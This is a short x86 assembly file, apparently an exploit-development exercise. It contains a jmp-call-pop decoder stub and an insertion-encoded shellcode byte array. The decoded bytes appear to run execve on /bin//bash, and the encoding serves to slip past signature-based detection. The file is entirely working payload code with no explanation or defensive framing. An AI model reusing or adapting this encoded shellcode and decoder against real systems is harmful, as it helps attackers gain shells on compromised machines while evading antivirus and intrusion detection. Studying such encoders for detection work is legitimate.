;decode and run Inserction shellcode
;author: Javier Tejedor
;date: 10/09/2014

global _start

section .text

_start:
	jmp short shellcode

code:
	pop esi
	push 38		;number of rounds
	pop ecx
	xor ebx, ebx
	inc esi

set_counter:		;each 3 times, it will be executed
	push 3		
	pop eax
	inc ebx
	dec esi

decoder:
	inc esi	
	dec eax
	jz set_counter

move_memory:
	mov dl, byte[esi + ebx]
	mov byte [esi], dl		;create movement in memory
	loop decoder
	jmp short shellcodeEncoded	;jumps to the shellcode decoded
	
shellcode:
	call code
	shellcodeEncoded: db 0x31,0xfd,0xc0,0x31,0x43,0xc9,0x50,0x94,0x68,0x62,0x21,0x61,0x73,0x06,0x68,0x68,0xd2,0x2f,0x2f,0x4b,0x2f,0x2f,0x79,0x68,0x2f,0xd8,0x62,0x69,0x13,0x6e,0x89,0xcf,0xe3,0x50,0x92,0xb0,0x0b,0x03,0xcd,0x80,0x40
